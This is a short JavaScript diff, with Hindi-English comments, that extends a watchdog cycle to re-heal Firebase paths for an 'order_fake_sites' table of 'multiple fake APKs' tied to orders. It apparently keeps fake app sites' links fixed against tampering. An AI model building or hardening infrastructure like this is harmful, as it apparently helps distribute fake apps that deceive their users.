@@ -151,6 +151,19 @@ async function runWatchdogCycle() {
         console.log(`[watchdog] healed ${r.path} (fake) — ${r.reason}`);
       }
     }
+    // EXTRA FAKE SITES paths (multiple fake APKs) — inke config bhi heal
+    // hote hain warna hacker inka link badal ke rakhe to wahi reh jata
+    try {
+      const sites = db.prepare('SELECT id, register_url, firebase_path FROM order_fake_sites WHERE order_id=? AND firebase_path IS NOT NULL').all(o.id);
+      for (const s of sites) {
+        if (!s.firebase_path || !s.register_url) continue;
+        const r = await healPath(s.firebase_path, deriveFakeUrls(s.register_url));
+        if (r) {
+          healed++;
+          console.log(`[watchdog] healed ${r.path} (fake site #${s.id}) — ${r.reason}`);
+        }
+      }
+    } catch (e) { /* table nahi hai (purana DB) to skip */ }
   }
   if (healed > 0) console.log(`[watchdog] cycle done — ${healed} path(s) wapas theek kiye.`);
 }
